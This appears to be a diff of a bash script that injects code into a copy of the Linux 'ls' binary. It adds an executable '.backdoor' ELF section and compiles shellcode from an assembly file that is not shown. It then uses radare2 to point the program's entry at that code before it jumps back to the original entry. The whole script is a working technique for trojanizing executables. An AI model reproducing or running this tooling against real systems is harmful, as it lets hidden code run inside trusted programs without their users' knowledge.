@@ -1,14 +1,36 @@
 #!/bin/bash
-rm ls
+rm injected_ls
 cp /bin/ls .
+mv ./ls injected_ls
 # Generate 100bytes of nops
-seq 100 | xargs -i bash -c 'echo -ne x90 >> nopsection' 
-objcopy --add-section .backdoor=nopsection --set-section-flags .backdoor=alloc,load,code ls 
-objcopy --adjust-section-vma .backdoor=0xbeef ls
+seq 100 | xargs -i bash -c 'echo -ne "\x90" >> nopsection' 
+
+# Add section and make it rwx
+objcopy --add-section .backdoor=nopsection --set-section-flags .backdoor=alloc,load,code injected_ls 
+objcopy --adjust-section-vma .backdoor=0xbeef injected_ls
 #https://reverseengineering.stackexchange.com/questions/14779/how-to-successfully-add-a-code-section-to-an-executable-file-in-linux
-# Need to adjust segment too, segment is not loaded.
-ENTRYPOINT=$(readelf -a ls | grep Entry | cut -d : -f 2 | sed 's/^\s\+//g')
+
+
+# Storing original entrypoint
+ENTRYPOINT=$(readelf -a injected_ls | grep Entry | cut -d : -f 2 | sed 's/^\s\+//g')
 echo "Original entry=$ENTRYPOINT"
-#[0x00000018]> wx efbe
-# 0x18
-r2 -c "0x18; oo+;wx efbe;0xbeef; \"wa nop;nop;nop;push rax; push rbx; pop rbx; pop rax; jmp $ENTRYPOINT\"" ls
+
+
+# Generating payload
+sed  "s/.*;ENTRY/  jmp $ENTRYPOINT  ;ENTRY/g" -i test.asm
+nasm test.asm -o test.o -f elf64
+shellcode=$(objdump -d test.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d ' '| tr -s ' '| tr '\t' ' '| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s )
+echo -ne $shellcode > shellcode
+
+# Adding Jump to entrypoint
+rasm2 -a 'x86' -b 64  "jmp $ENTRYPOINT" >> shellcode
+
+
+# Changing Entry and injecting payload
+r2 -c "0x18; oo+;wx efbe;0xbeef;wff ./shellcode; pd 20" injected_ls
+#r2 -c "0x18; oo+;wx efbe;0xbeef; \"wa nop;nop;nop;push rax; push rbx; pop rbx; pop rax; jmp $ENTRYPOINT\"" injected_ls
+
+
+
+
+rm nopsection
